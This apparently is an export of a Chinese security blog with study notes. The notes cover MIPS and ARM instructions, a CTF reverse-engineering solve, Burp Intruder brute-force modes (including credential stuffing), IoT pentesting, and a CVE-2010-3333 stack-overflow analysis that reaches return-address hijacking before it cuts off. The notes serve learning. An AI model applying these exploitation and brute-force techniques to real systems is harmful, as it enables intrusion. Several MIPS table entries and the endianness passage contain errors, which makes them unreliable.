title="MIPS指令"></a>MIPS指令</h3><p>|:—-:|:—-:|<br>|指令|功能|<br>|LB|从存储器中读取一个字节的数据到寄存器中|<br>|LH|从存储器中读取半个字的数据到寄存器中|<br>|LW|从存储器中读取一个字的数据到寄存器中|<br>|LD|从存储器中读取双字的数据到寄存器中|<br>|L.S|从存储器中读取单精度浮点数到寄存器中|<br>|L.D|从存储器中读取双精度浮点数到寄存器中|<br>|LBU|=LB,无符号数据|<br>|LHU|=LH,无符号数据|<br>|LWU|=LW,无符号数据|<br>|SB|把一个字节的数据从寄存器存储到存储器中|<br>|SH|把半个字节的数据从寄存器存储到存储器中|<br>|SW|把一个字的数据从寄存器存储到存储器中|<br>|SD|把两个字节的数据从寄存器存储到存储器中|<br>|S.S|把单精度浮点数从寄存器存储到存储器中|<br>|S.D|把双精度数据从存储器存储到存储器中|<br>|DADD|把两个定点寄存器的内容相加，即定点加|<br>|DADDI|把一个寄存器的内容加上一个立即数|<br>|DADDU|不带符号的加|<br>|DADDIU|把一个寄存器的内容加上一个无符号的立即数|<br>|ADD.S|把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数|<br>|ADD.D|把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数|<br>|ADD.PS|两个单精度浮点数相加，结果是单精度浮点数|<br>|DSUB|两个寄存器的内容相减|<br>|DSUBU|不带符号的减|<br>|SUB.S|一个双精度浮点数减去一个单精度浮点数，结果是单精度浮点数|<br>|SUB.D|一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数|<br>|SUB.PS|两个单精度浮点数相减|<br>|DDIV|两个顶点寄存器的内容相除|<br>|DDIVU|不带符号的除法运算|<br>|DIV.S|双精度浮点数除以单精度浮点数，结果为单精度浮点数|<br>|DIV.D|双精度浮点数除以单精度浮点数，结果为双精度浮点数|<br>|DIV.PS|两个单精度浮点数相除，结果为单精度|<br>|DMUL|两个定点寄存器的内容相乘|<br>|DMULU|无符号相乘|<br>|MUL.S|双浮点乘单浮点得单浮点|<br>|MUL.D|双浮点乘单浮点得双浮点|<br>|MUL.PS|两个单浮点乘，得单浮点|<br>|AND|与运算|<br>|ANDI|一个寄存器中的内容与一个立即数相与|<br>|OR|或运算|<br>|ORI||<br>|XOR|异或|<br>|XORI||<br>|BEQZ|条件转移指令，当寄存器中内容为0时转移发生|<br>|BENZ|条件转移指令，寄存器内容不为0时转移发生|<br>|BEQ|条件转移指令，两个寄存器内容相等是转移发生|<br>|BNE|条件转移指令，两个寄存器中内容不等时转移发生|<br>|J|直接跳转指令，跳转的地址在指令中|<br>|JR|使用寄存器的跳转指令，跳转的地址在寄存器中|<br>|JAL|直接跳转指令，带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31寄存器中|<br>|JALR|使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31|<br>|MOV.S|把单浮点数从浮点寄存器复制到另一个浮点寄存器|<br>|MOV.D|把一个双浮点数从一个浮点寄存器复制到另一个浮点寄存器|<br>|MFC0|把一个数据从通用寄存器复制到特殊寄存器|<br>|MTC0|把一个数据从特殊寄存器复制到通用寄存器|<br>|MFC1|把一个数据从定点寄存器复制到浮点寄存器|<br>|MTC1|把一个数据从浮点寄存器复制到定点寄存器|<br>|LUI|把一个16位的立即数填入到寄存器的高16位，低16位补零|<br>|DSLL|双字逻辑左移|<br>|DSRL|双字逻辑右移|<br>|DSRA|双字算术右移|<br>|DSLLV|可变的双字逻辑左移|<br>|DSRLV|可变的双字逻辑右移|<br>|DSRAV|可变的双字算术右移|<br>|SLT|如果r2的值小于r3，设置r1为1，否在设置r1为0|<br>|SLTI|r2的值小于立即数，则r1为1，否则为0|<br>|SLTU|=SLT带符号|<br>|SLTUI|=SLT不带符号|<br>|MOVN|若第三个寄存器内容为负，那么复制一个寄存器内容到另一个寄存器|<br>|MOVZ|若第三个寄存器内容为0，则复制一个寄存器的内容到另一个寄存器|<br>|TRAP|根据地址向量转入管态|<br>|ERET|从异常中返回到用户态|<br>|MADD.S|一个双浮点数与单浮点数相乘加，结果为单|<br>|MADD.D|一个双浮点数与单浮点数相乘加，结果为双|<br>|MADD.PS|两个单浮点数相乘加，结果为单|</p><h3 id="大端序小端序复习"><a href="#大端序小端序复习" class="headerlink" title="大端序小端序复习"></a>大端序小端序复习</h3><p>字节序，又称端序，尾须序，大小端序与硬件的体系结构有关，所有x86系列的pc机都是小断续，与操作系统无关，</p><p>大端字节序，高子杰存于内存低地址，弟子姐姐存于内存搞地质，小端字节序反之。</p>]]></content>
    
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDCTF RE windows_re2</title>
    <link href="/2022/08/09/DDCTF2019re/"/>
    <url>/2022/08/09/DDCTF2019re/</url>
    
    <content type="html"><![CDATA[<p>esp定律脱壳Aspack，然后ida分析一波。</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> sub<span class="hljs-constructor">_401320()</span><br>{<br>  <span class="hljs-built_in">char</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-C04h]</span><br>  <span class="hljs-built_in">char</span> v2; <span class="hljs-comment">// [esp+9h] [ebp-C03h]</span><br>  <span class="hljs-built_in">char</span> v3; <span class="hljs-comment">// [esp+408h] [ebp-804h]</span><br>  <span class="hljs-built_in">char</span> v4; <span class="hljs-comment">// [esp+409h] [ebp-803h]</span><br>  <span class="hljs-built_in">char</span> v5; <span class="hljs-comment">// [esp+808h] [ebp-404h]</span><br>  <span class="hljs-built_in">char</span> v6; <span class="hljs-comment">// [esp+809h] [ebp-403h]</span><br>  v3 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v4</span>, 0, 0x3FF)</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v6</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"input code:"</span>);<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785526D4</span>]</span>(<span class="hljs-string">"%s"</span>, &amp;v3);<br>  <span class="hljs-keyword">if</span> ( !(unsigned __int8)sub<span class="hljs-constructor">_4011F0()</span> )<br>  {<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"invalid input\n"</span>);<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78542455</span>]</span>(<span class="hljs-number">0</span>);<br>  }<br>  sub<span class="hljs-constructor">_401240(&amp;<span class="hljs-params">v5</span>)</span>;<br>  v1 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v2</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78552E73</span>]</span>(&amp;v1, <span class="hljs-string">"DDCTF{%s}"</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( !strcmp(&amp;v1, <span class="hljs-string">"DDCTF{reverse+}"</span>) )<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"You've got it !!! %s\n"</span>, &amp;v1);<br>  <span class="hljs-keyword">else</span><br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"Something wrong. Try again...\n"</span>);<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>限制输入0-9,A-F,可想到十六进制</li><li>输入字符经过变换与“DDCTF{reverse+}”对比，相同则成功。</li></ul><p>先尝试输入字符串<code>1234567AAA</code>,得到加密后字符 <code>EjRWeqo=</code>,看着像base664,直接base64转成十六进制尝试，发现得到了我输入字符串。<br>将<code>reverse+</code>转换得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>RE</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-6418</title>
    <link href="/2022/08/09/CVE-2020-6418/"/>
    <url>/2022/08/09/CVE-2020-6418/</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>(资料来自绿盟科技)</p><p>2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.</p><p>CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。</p><p>受影响产品版本：</p><p>Google Chrome Version&lt;80.0.3987.122</p><p>适用于windows,Mac,Linux.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.nsfocus.net/cve-2020-6418">http://blog.nsfocus.net/cve-2020-6418</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>chrome调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>burp四种密码爆破模式学习</title>
    <link href="/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<ul><li>Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变</li><li>Battering ram:多参数同时爆破，但用的是同一个字典</li><li>Pitchfork:多参数同时爆破，但用的是不同的字典</li><li>Cluster bamb:多参数做笛卡尔乘积模式爆破</li></ul><h1 id="Sniper-狙击手"><a href="#Sniper-狙击手" class="headerlink" title="Sniper(狙击手)"></a>Sniper(狙击手)</h1><p>（一对一）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。</p><ul><li>此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景</li></ul><h1 id="Battering-ram-破城槌"><a href="#Battering-ram-破城槌" class="headerlink" title="Battering ram(破城槌)"></a>Battering ram(破城槌)</h1><p>（payload一对多）</p><p>一个参数a，若payload有x个，则执行x次。</p><p>两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。</p><ul><li>此模式主要适用于：撞库</li></ul><h1 id="Pitchfork-音叉"><a href="#Pitchfork-音叉" class="headerlink" title="Pitchfork(音叉)"></a>Pitchfork(音叉)</h1><p>可以多组密码本payload</p><p>a:1,2</p><p>b:3,4</p><p>第一次爆破为 1，3</p><p>第二次爆破为 2，4</p><ul><li>此模式主要适用于：恶意注册</li></ul><h1 id="Cluster-bomb-集束炸弹"><a href="#Cluster-bomb-集束炸弹" class="headerlink" title="Cluster bomb(集束炸弹)"></a>Cluster bomb(集束炸弹)</h1><p>（多对多）</p><p>对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。</p>]]></content>
    
    
    
    <tags>
      
      <tag>bp</tag>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《物联网渗透测试》学习笔记1</title>
    <link href="/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <url>/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-IOT渗透测试"><a href="#0x01-IOT渗透测试" class="headerlink" title="0x01 IOT渗透测试"></a>0x01 IOT渗透测试</h1><p>定义IoT生态系统与渗透测试生命周期</p><ul><li>渗透测试方法：<ul><li>黑盒测试</li><li>白盒测试</li><li>灰盒测试</li></ul></li></ul><h2 id="固件入门"><a href="#固件入门" class="headerlink" title="固件入门"></a>固件入门</h2><p>固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。</p><p>固件通常由bootloader、内核、文件系统以及其他资源组成，</p><p>固件组成：闪存、bootloader、内核、根文件系统。</p><ul><li>bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。</li><li>固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。</li></ul><h2 id="IoT中的Web应用"><a href="#IoT中的Web应用" class="headerlink" title="IoT中的Web应用"></a>IoT中的Web应用</h2><p>通常嵌入书web应用被设计为在自包含的环境中运行</p><ul><li>目前iot领域主要有两种不同的web应用模型<ul><li>混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。</li><li>独立嵌入式服务器模型</li></ul></li></ul><p>web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。</p><h2 id="硬件设备基础"><a href="#硬件设备基础" class="headerlink" title="硬件设备基础"></a>硬件设备基础</h2><p>硬件输入：</p><ul><li>EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。</li><li>NAND闪存以区块为单位读写。存储设备的boootloader。</li><li>UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。</li><li>JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口）</li></ul><h2 id="IoT无线通信简介"><a href="#IoT无线通信简介" class="headerlink" title="IoT无线通信简介"></a>IoT无线通信简介</h2><p>最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。</p><h1 id="IoT威胁建模"><a href="#IoT威胁建模" class="headerlink" title="IoT威胁建模"></a>IoT威胁建模</h1>]]></content>
    
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《ARM嵌入式Linux系统开发详解》学习笔记1</title>
    <link href="/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <url>/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-嵌入式系统入门"><a href="#0x01-嵌入式系统入门" class="headerlink" title="0x01 嵌入式系统入门"></a>0x01 嵌入式系统入门</h1><p><b>什么是嵌入式系统：</b></p><p>一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。</p><p><b>嵌入式微控制器：</b></p><p>嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。</p><p>通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。</p><p><b>嵌入式微处理器：</b></p><p>单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。</p><p><b>典型嵌入式系统组成：</b></p><p>嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。</p><p>嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。</p><p>典型嵌入式系统:</p><ul><li>硬件：<ul><li>嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号</li><li>外部设备：在不同系统中有不同选择。</li></ul></li><li>软件：<ul><li>嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。</li><li>应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。</li></ul></li></ul><h1 id="0x02-嵌入式软硬件系统"><a href="#0x02-嵌入式软硬件系统" class="headerlink" title="0x02 嵌入式软硬件系统"></a>0x02 嵌入式软硬件系统</h1><p>数字电路是计算机的基础。</p><p>进制转换</p><p>计算机组成原理</p><p>直接内存访问：DMA</p><p>软件：系统软件、应用软件</p><p>软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。</p><p>常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。</p><p>操作系统的基本结构都是内核、驱动程序、程序库。</p><h1 id="0x03-ARM处理器"><a href="#0x03-ARM处理器" class="headerlink" title="0x03 ARM处理器"></a>0x03 ARM处理器</h1><ul><li>微处理器<ul><li>通用微处理器：用于高性能计算</li><li>嵌入式微处理器：针对某种特定应用的高能力计算</li><li>微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。</li></ul></li></ul><p>ARM:高性能RISC机器。</p><ul><li>芯片体积小，功耗低，成本低性能优异</li><li>支持Thumb(16位)和ARM(32位)</li><li>内部大量使用寄存器，执行指令速度快。</li><li>大部分指令是操作寄存器，很少访问外部内存</li><li>采用多级流水线结构处理速度快。</li><li>多种寻址方式，数据存取方式灵活</li><li>指令长度固定，便于编译器操作以及执行指令</li></ul><h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><ul><li>算术运算指令<ul><li>ADD:加法运算<ul><li>add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2</li></ul></li><li>ADC:带进位加法<ul><li>ADC dest,op1,op2</li></ul></li><li>SUB:减法<ul><li>sub dest,op1,op2</li><li>dest=op1-op2</li></ul></li><li>SBC：带进位减法</li></ul></li><li>逻辑运算指令<ul><li>AND:逻辑与(1 1为1，0 0为1，1 0为0)<ul><li>and dest,op1,op2</li><li>dest=op1 and op2</li></ul></li><li>EOR:异或（1 1为0，0 0为0，10为1）</li><li>MOV:复制数据<ul><li>mov dest,op1</li><li>dest=op1</li><li>mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8</li></ul></li></ul></li><li>分支指令<ul><li>B:跳转<ul><li>b 地址 //跳转到指定地址</li></ul></li></ul></li><li>数据传送指令<ul><li>单一数据传送指令：向内存装载和存储一个字节或一个字长的数据<ul><li>LDR Rd,地址</li><li>STR Rd,地址</li><li>LDR B Rd,地址</li><li>STR B Rd,地址</li></ul></li><li>多数据传送指令：向内存装载和存储多个字节或字的数据<ul><li>xxM Rn(!),&lt;寄存器列表&gt;{^}</li><li>xx:LD–装载，ST–存储</li><li>LDMED LDMIB//++i</li><li>LDMFD LDMIA//i++</li><li>LDMEA LDMDB//++*i</li><li>LDMFA LDMDA//*i++</li><li>STMFA STMIB//存储前增加地址</li><li>STMEA STMIA//存储后增加地址</li><li>STMFD STMDB//存储前增加值</li><li>STMED STMDA//存储后增加值</li></ul></li></ul></li></ul><p>ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。</p><p>MMU:内存管理单元。</p><blockquote><p>LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）<br>LSR:逻辑右移，二进制从左往右，空位补0<br>ASR:算术右移，符号位不变，高位空出补0，低位补1<br>ROR:循环右移，低位移到高位<br>RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充</p></blockquote><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ul><li>立即寻址:用#表示数值<ul><li>subs r0,#1;r0=r0-1</li><li>mov r0,#0xff00;r0=0xff00</li></ul></li><li>寄存器寻址方式：读取寄存器得到操作数<ul><li>mov r1,r2;r1=r2</li><li>sub r0,r1,r2;r0=r1-r2</li></ul></li><li>寄存器偏移寻址：寄存器的值移位得结果<ul><li>mov r0,r1,LSL #3;r0=r1*8</li><li>ands r0,r2,LSL #3;r0= r2*8 and r1</li></ul></li><li>寄存器间接寻址：寄存器为地址，从对应内存重取出数据<ul><li>LDR r0,[r1];r1为地址，从内存中取出数据存入r0</li><li>SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换</li></ul></li><li>基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据<ul><li>LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址</li><li>STR r0,[r1,#-2];r1数值-2得到数据地址</li></ul></li><li>多寄存器寻址：一次传输多个寄存器值<ul><li>LDMIA r1!,{r2<del>r7,r12};r1单元重数据读到r2</del>r7和r12,r1指定地址自动加1</li></ul></li><li>栈寻址：先进后出，通过栈指针寄存器寻址<ul><li>STMFD SP!,{R0<del>R7,LR};r0</del>r7和LR的内容压入堆栈</li><li>LDMFD SP!,{r0<del>r7,LR};从堆栈中取出数据到r0</del>r7和LR</li></ul></li></ul><h1 id="0x04-嵌入式Linux"><a href="#0x04-嵌入式Linux" class="headerlink" title="0x04 嵌入式Linux"></a>0x04 嵌入式Linux</h1><p>一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。</p><h1 id="0x05-建立软件开发环境"><a href="#0x05-建立软件开发环境" class="headerlink" title="0x05 建立软件开发环境"></a>0x05 建立软件开发环境</h1><ul><li>运行在windows平台下得到Linux系统模拟环境：Cygwin.</li><li>linux下：串口工具minicom</li><li>windows下：串口工具xshell</li><li>ARM集成开发环境ADS<ul><li>c语言编译器armcc</li><li>c++语言编译器armcpp</li></ul></li></ul><h1 id="0x06-第一个linux应用程序"><a href="#0x06-第一个linux应用程序" class="headerlink" title="0x06 第一个linux应用程序"></a>0x06 第一个linux应用程序</h1><ul><li>vi创建源代码文件hello.c</li><li>gcc -c hello.c 编译运行</li></ul><h1 id="0x07-Linux应用程序编程基础"><a href="#0x07-Linux应用程序编程基础" class="headerlink" title="0x07 Linux应用程序编程基础"></a>0x07 Linux应用程序编程基础</h1><ul><li>堆栈</li><li>内存管理函数<ul><li>malloc():分配内存，不能初始化内存空间</li><li>free()：释放malloc()分配的内存</li></ul></li><li>实用的内存分配函数<ul><li>calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间</li><li>realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。</li></ul></li><li>文件指针和流：FILE*fp</li><li>getc() /fgetc() /getchar()</li><li>POSIX文件I/O编程<ul><li>POSIX可移植操作系统接口</li><li>open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性</li><li>文件头：<ul><li>&lt;sys/types.h&gt;</li><li>&lt;sys/stat.h&gt;</li><li>&lt;fcntl.h&gt;</li></ul></li></ul></li></ul><h1 id="0x08-开发多进程-x2F-线程程序"><a href="#0x08-开发多进程-x2F-线程程序" class="headerlink" title="0x08 开发多进程/线程程序"></a>0x08 开发多进程/线程程序</h1><ul><li>PCB进程控制块</li><li>fork()调用创建进程</li><li>退出进程：exit()、_exit()、atexit()、on_exit().</li><li>常用进程间通信方法：<ul><li>管道：单方向传送数据，只能在有共同父进程的进程间使用<ul><li>pipe()函数：创建管道</li><li>#include&lt;unistd.h&gt; int pipe(int filedes[1]);</li></ul></li><li>共享内存：不同进程可访问<ul><li>int shmget():创建</li><li>void *shmat：获得一个共享内存ID对应的内存其实地址</li><li>int shmdt：从程序中分立一块共享内存</li></ul></li><li>FIFO</li><li>消息队列</li><li>信号量</li><li>共享存储</li><li>socker</li></ul></li><li>Linux的多进程和多线程</li></ul><h1 id="0x09-网络通信应用"><a href="#0x09-网络通信应用" class="headerlink" title="0x09 网络通信应用"></a>0x09 网络通信应用</h1><ul><li>TCP/IP协议簇</li></ul><p><img src="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png" alt="捕获.PNG"></p><ul><li>IP协议：在传输层，负责数据包的传输管理<ul><li>实现两个功能：寻址和分段</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞战争学习笔记2：CVE-2010-3333</title>
    <link href="/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/"/>
    <url>/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p><p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p><h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p><p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p><h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p><p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p><p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p><p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p><p>[待续]</p><p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p><ul><li>g</li><li>kb</li></ul><p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p><p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p><ul><li>p</li></ul><p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp 